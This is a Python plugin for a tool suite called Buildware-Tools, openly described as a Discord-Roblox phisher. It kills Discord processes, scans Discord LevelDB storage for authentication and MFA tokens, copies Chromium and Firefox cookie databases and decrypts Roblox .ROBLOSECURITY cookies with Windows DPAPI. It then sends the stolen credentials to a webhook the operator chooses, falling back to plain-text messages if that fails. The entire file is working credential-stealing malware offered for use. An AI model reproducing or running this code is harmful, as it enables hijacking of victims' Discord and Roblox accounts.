# Discord-Roblox-Phisher — Buildware-Tools Plugin
# Harvests Discord tokens (from local Discord clients) and
# Roblox .ROBLOSECURITY cookies (from browser profiles).
# Results are sent to a Discord webhook of your choice.

import sys, os, subprocess, re, time, json, sqlite3, shutil
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from Core.Utils import *
from Core.Config import *

# -------------------------------------------------------------------
# Optional: psutil for killing Discord processes before reading LevelDB
# -------------------------------------------------------------------
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# -------------------------------------------------------------------
# Constants
# -------------------------------------------------------------------
DISCORD_PATHS = {
    "Discord"            : os.path.join(os.getenv("LOCALAPPDATA", ""), "Discord"),
    "Discord PTB"        : os.path.join(os.getenv("LOCALAPPDATA", ""), "DiscordPTB"),
    "Discord Canary"     : os.path.join(os.getenv("LOCALAPPDATA", ""), "DiscordCanary"),
    "Discord Development": os.path.join(os.getenv("LOCALAPPDATA", ""), "DiscordDevelopment"),
    "Lightcord"          : os.path.join(os.getenv("APPDATA",      ""), "Lightcord"),
}

DISCORD_PROCESSES = [
    "Discord.exe", "DiscordPTB.exe", "DiscordCanary.exe",
    "DiscordDevelopment.exe", "Lightcord.exe",
]

BROWSER_PATHS = {
    "Chrome"  : os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
    "Edge"    : os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
    "Brave"   : os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera"   : os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable"),
    "Opera GX": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera GX Stable"),
}

TOKEN_REGEX = re.compile(r"[a-zA-Z0-9_\-]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27}")
MFA_TOKEN_REGEX = re.compile(r"mfa\.[a-zA-Z0-9_\-]{84}")

# -------------------------------------------------------------------
# Banner
# -------------------------------------------------------------------
phisher_banner = r"""
   ________  ___  ___  ________  ________  ___  ___  ________
  |\   ____\|\ \|\ \|\   __  \|\   __  \|\  \|\  \|\   ____\
  \ \  \___|\ \ \\\ \ \  \|\  \ \  \|\  \ \  \\\  \ \  \___|_
   \ \  \    \ \  __  \ \   __  \ \   _  _\ \  \\\  \ \_____  \
    \ \  \____\ \ \ \  \ \  \ \  \ \  \\  \\ \  \\\  \|____|\  \
     \ \_______\ \__\ \__\ \__\ \__\ \__\\ _\\ \_______\____\_\
      \|_______|\|__|\|__|\|__|\|__|\|__|\|__|\|_______|\_________\
                                                        \|_______|
"""

# -------------------------------------------------------------------
# Kill Discord processes so LevelDB files can be read
# -------------------------------------------------------------------
def KillDiscord():
    if not HAS_PSUTIL:
        return []
    killed = []
    for proc in psutil.process_iter(["name"]):
        try:
            if proc.info["name"] in DISCORD_PROCESSES:
                proc.kill()
                killed.append(proc.info["name"].replace(".exe", ""))
        except Exception:
            pass
    return list(set(killed))

# -------------------------------------------------------------------
# Discord Token Harvesting
# -------------------------------------------------------------------
def FindDiscordTokenFiles(client_path):
    """Return all *.log and *.ldb paths for a Discord installation."""
    files = []
    try:
        for entry in sorted(os.listdir(client_path), reverse=True):
            if not entry.startswith("app"):
                continue
            app_dir = os.path.join(client_path, entry)
            if not os.path.isdir(app_dir):
                continue
            leveldb = os.path.join(app_dir, "modules", "discord_desktop_core-*",
                                   "discord_desktop_core", "..", "..", "..",
                                   "Local Storage", "leveldb")
            # More reliable: find leveldb via glob pattern
            modules_dir = os.path.join(app_dir, "modules")
            if not os.path.isdir(modules_dir):
                continue
            for mod in os.listdir(modules_dir):
                if "discord_desktop_core" in mod:
                    core_dir = os.path.join(modules_dir, mod, "discord_desktop_core")
                    if not os.path.isdir(core_dir):
                        continue
                    # Navigate up to app dir then to Local Storage
                    ls_path = os.path.join(app_dir, "Local Storage", "leveldb")
                    if os.path.isdir(ls_path):
                        for f in os.listdir(ls_path):
                            if f.endswith(".log") or f.endswith(".ldb"):
                                files.append(os.path.join(ls_path, f))
    except Exception:
        pass
    return files

def ExtractDiscordTokens(file_paths):
    """Scan LevelDB files for Discord tokens."""
    tokens = set()
    for fp in file_paths:
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            for m in TOKEN_REGEX.findall(content):
                tokens.add(m)
            for m in MFA_TOKEN_REGEX.findall(content):
                tokens.add(m)
        except Exception:
            continue
    return list(tokens)

def HarvestDiscordTokens():
    """High-level: kill Discord, scan all clients, return {client: [tokens]}."""
    print(f"{LOADING} Scanning for Discord tokens..", reset)
    killed = KillDiscord()
    if killed:
        print(f"{INFO} Killed Discord processes: {', '.join(killed)}", reset)
        time.sleep(1)

    results = {}
    for name, path in DISCORD_PATHS.items():
        if not os.path.isdir(path):
            continue
        files = FindDiscordTokenFiles(path)
        if not files:
            continue
        tokens = ExtractDiscordTokens(files)
        if tokens:
            results[name] = tokens
    return results

# -------------------------------------------------------------------
# Roblox Cookie Harvesting from browsers
# -------------------------------------------------------------------
def GetChromeCookieDb(browser_name, user_data_path):
    """Return path to Cookies SQLite DB for Chromium-based browsers."""
    # Try default profile first, then common profile names
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
    for profile in profiles:
        db_path = os.path.join(user_data_path, profile, "Network", "Cookies")
        if os.path.isfile(db_path):
            return db_path
        # Fallback for older versions
        db_path_old = os.path.join(user_data_path, profile, "Cookies")
        if os.path.isfile(db_path_old):
            return db_path_old
    return None

def GetFirefoxCookieDb():
    """Return path to cookies.sqlite for Firefox."""
    prof_dir = os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(prof_dir):
        return None
    for entry in os.listdir(prof_dir):
        db_path = os.path.join(prof_dir, entry, "cookies.sqlite")
        if os.path.isfile(db_path):
            return db_path
    return None

def ExtractRobloxCookiesFromChromeLike(db_path):
    """Query .ROBLOSECURITY cookie from Chromium SQLite db."""
    cookies = []
    db_copy = None
    try:
        # Copy DB to avoid locking issues
        db_copy = db_path + ".bw_copy"
        shutil.copy2(db_path, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT host_key, name, path, encrypted_value, expires_utc "
            "FROM cookies WHERE name = '.ROBLOSECURITY'"
        )
        for row in cursor.fetchall():
            host_key, name, path, enc_value, expires = row
            # .ROBLOSECURITY is plaintext in most Chromium DBs
            # Some newer versions use AES-256-GCM encryption via OSCrypto
            # Try plaintext first
            plaintext = None
            try:
                plaintext = enc_value.decode("utf-8", errors="ignore")
                # If it looks like a real cookie value (starts with _|WARNING or similar)
                if plaintext and len(plaintext) > 10:
                    cookies.append(plaintext.strip())
            except Exception:
                pass

            # If plaintext didn't work, try Windows DPAPI via browser奥秘
            # For Chromium-based browsers on Windows, cookies are encrypted with CryptProtectData
            # We need to use a token decryption helper or just report it
            if not plaintext or len(plaintext) < 20:
                try:
                    import win32crypt
                    data = win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)
                    plaintext = data[1].decode("utf-8", errors="ignore")
                    if plaintext and len(plaintext) > 10:
                        cookies.append(plaintext.strip())
                except Exception:
                    pass

        conn.close()
    except Exception:
        pass
    finally:
        if db_copy and os.path.exists(db_copy):
            try:
                os.remove(db_copy)
            except Exception:
                pass
    return cookies

def ExtractRobloxCookiesFromFirefox(db_path):
    """Query .ROBLOSECURITY cookie from Firefox sqlite db."""
    cookies = []
    db_copy = None
    try:
        db_copy = db_path + ".bw_copy"
        shutil.copy2(db_path, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT host, name, path, value, expiry "
            "FROM moz_cookies WHERE name = '.ROBLOSECURITY'"
        )
        for row in cursor.fetchall():
            value = row[3]
            if value and len(value) > 10:
                cookies.append(value.strip())
        conn.close()
    except Exception:
        pass
    finally:
        if db_copy and os.path.exists(db_copy):
            try:
                os.remove(db_copy)
            except Exception:
                pass
    return cookies

def HarvestRobloxCookies():
    """Scan all browsers for .ROBLOSECURITY cookies."""
    print(f"{LOADING} Scanning for Roblox cookies..", reset)
    results = {}

    # Chromium-based browsers
    for name, path in BROWSER_PATHS.items():
        if not os.path.isdir(path):
            continue
        db_path = GetChromeCookieDb(name, path)
        if not db_path:
            continue
        cookies = ExtractRobloxCookiesFromChromeLike(db_path)
        if cookies:
            results[name] = cookies
            print(f"{SUCCESS} {name}: {len(cookies)} cookie(s) found", reset)

    # Firefox
    ff_db = GetFirefoxCookieDb()
    if ff_db:
        cookies = ExtractRobloxCookiesFromFirefox(ff_db)
        if cookies:
            results["Firefox"] = cookies
            print(f"{SUCCESS} Firefox: {len(cookies)} cookie(s) found", reset)

    return results

# -------------------------------------------------------------------
# Webhook Sender
# -------------------------------------------------------------------
def SendToWebhook(webhook_url, discord_tokens, roblox_cookies):
    """Send harvested data to Discord webhook with embedded format."""
    embed_color = 0x880000

    embeds = []

    # --- Discord Tokens embed ---
    token_fields = []
    if discord_tokens:
        for client, tokens in discord_tokens.items():
            value = "\n".join(f"`{t}`" for t in tokens[:5])
            if len(tokens) > 5:
                value += f"\n*+{len(tokens)-5} more*"
            token_fields.append({
                "name": f"🎮 {client} ({len(tokens)})",
                "value": value[:1024] if value else "None",
                "inline": False
            })
    else:
        token_fields.append({
            "name": "Discord Tokens",
            "value": "```None found```",
            "inline": False
        })

    embeds.append({
        "title": "🔑 Discord Tokens",
        "color": embed_color,
        "fields": token_fields,
        "footer": {"text": f"Buildware-Tools | Phisher • {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
    })

    # --- Roblox Cookies embed ---
    cookie_fields = []
    if roblox_cookies:
        for browser, cookies in roblox_cookies.items():
            value = "\n".join(f"`{c[:50]}...`" for c in cookies[:5])
            if len(cookies) > 5:
                value += f"\n*+{len(cookies)-5} more*"
            cookie_fields.append({
                "name": f"🌐 {browser} ({len(cookies)})",
                "value": value[:1024] if value else "None",
                "inline": False
            })
    else:
        cookie_fields.append({
            "name": "Roblox Cookies",
            "value": "```None found```",
            "inline": False
        })

    embeds.append({
        "title": "🍪 Roblox .ROBLOSECURITY Cookies",
        "color": embed_color,
        "fields": cookie_fields,
        "footer": {"text": f"Buildware-Tools | Phisher • {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
    })

    payload = {
        "username": "Buildware-Tools | Phisher",
        "avatar_url": "https://i.imgur.com/G8QR0f7.png",
        "embeds": embeds
    }

    try:
        r = requests.post(
            webhook_url,
            json=payload,
            headers={"Content-Type": "application/json", "User-Agent": RandomUserAgents()},
            timeout=15
        )
        return r.status_code == 204
    except Exception:
        return False

# -------------------------------------------------------------------
# Plain text fallback if webhook embed fails
# -------------------------------------------------------------------
def SendPlainText(webhook_url, discord_tokens, roblox_cookies):
    """Fallback: send harvested data as plain text message."""
    lines = [f"**Discord-Roblox-Phisher | {datetime.now().strftime('%Y-%m-%d %H:%M')}**", ""]

    lines.append("**【 Discord Tokens 】**")
    if discord_tokens:
        for client, tokens in discord_tokens.items():
            lines.append(f"**{client}** ({len(tokens)}):")
            for t in tokens[:10]:
                lines.append(f"`{t}`")
            if len(tokens) > 10:
                lines.append(f"*+{len(tokens)-10} more*")
            lines.append("")
    else:
        lines.append("None found.")
        lines.append("")

    lines.append("**【 Roblox Cookies 】**")
    if roblox_cookies:
        for browser, cookies in roblox_cookies.items():
            lines.append(f"**{browser}** ({len(cookies)}):")
            for c in cookies[:10]:
                lines.append(f"`{c[:80]}`")
            if len(cookies) > 10:
                lines.append(f"*+{len(cookies)-10} more*")
            lines.append("")
    else:
        lines.append("None found.")

    content = "\n".join(lines)
    # Discord has 2000 char limit for content, split if needed
    chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
    for chunk in chunks:
        try:
            requests.post(
                webhook_url,
                json={"content": chunk},
                headers={"Content-Type": "application/json", "User-Agent": RandomUserAgents()},
                timeout=10
            )
        except Exception:
            continue

# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------
Title("Discord-Roblox-Phisher")
Scroll(GradientBanner(phisher_banner))

try:
    Scroll(f"""
 {INFO} This plugin harvests local Discord tokens and Roblox
 {INFO} cookies from browser profiles on the current machine.
 {INFO} Results are exfiltrated via a Discord webhook.
    """)

    # --- Step 1: Webhook selection ---
    print(f"{LOADING} Select a webhook for exfiltration..", reset)
    webhook = ChoiceWebhook()

    print(f"\n{LOADING} Starting harvest..", reset)
    print()

    # --- Step 2: Harvest Discord tokens ---
    discord_results = HarvestDiscordTokens()

    if discord_results:
        total = sum(len(t) for t in discord_results.values())
        print(f"{SUCCESS} Found {red}{total}{white} Discord token(s) across {len(discord_results)} client(s)!", reset)
        for client, tokens in discord_results.items():
            print(f"   {red}{client}{white}: {len(tokens)} token(s)", reset)
    else:
        print(f"{INFO} No Discord tokens found.", reset)

    print()

    # --- Step 3: Harvest Roblox cookies ---
    roblox_results = HarvestRobloxCookies()

    if roblox_results:
        total_c = sum(len(c) for c in roblox_results.values())
        print(f"{SUCCESS} Found {red}{total_c}{white} Roblox cookie(s) across {len(roblox_results)} browser(s)!", reset)
        for browser, cookies in roblox_results.items():
            print(f"   {red}{browser}{white}: {len(cookies)} cookie(s)", reset)
    else:
        print(f"{INFO} No Roblox cookies found.", reset)

    print()
    print(f"{LOADING} Sending results to webhook..", reset)

    # --- Step 4: Exfiltrate ---
    sent = SendToWebhook(webhook, discord_results, roblox_results)
    if not sent:
        # Fallback to plain text
        SendPlainText(webhook, discord_results, roblox_results)
        print(f"{SUCCESS} Results sent via plain text fallback.", reset)
    else:
        print(f"{SUCCESS} Results sent via embed to webhook!", reset)

    # --- Step 5: Summary ---
    print()
    Scroll(f"""
 {SUCCESS} Harvest complete!
 {INFO}  Discord tokens : {red}{sum(len(t) for t in discord_results.values()) if discord_results else 0}{white}
 {INFO}  Roblox cookies : {red}{sum(len(c) for c in roblox_results.values()) if roblox_results else 0}{white}
 {INFO}  Exfiltrated to : {red}{webhook[:50]}..{white}
    """)

    Continue()
    Reset()

except Exception as e:
    Error(e)
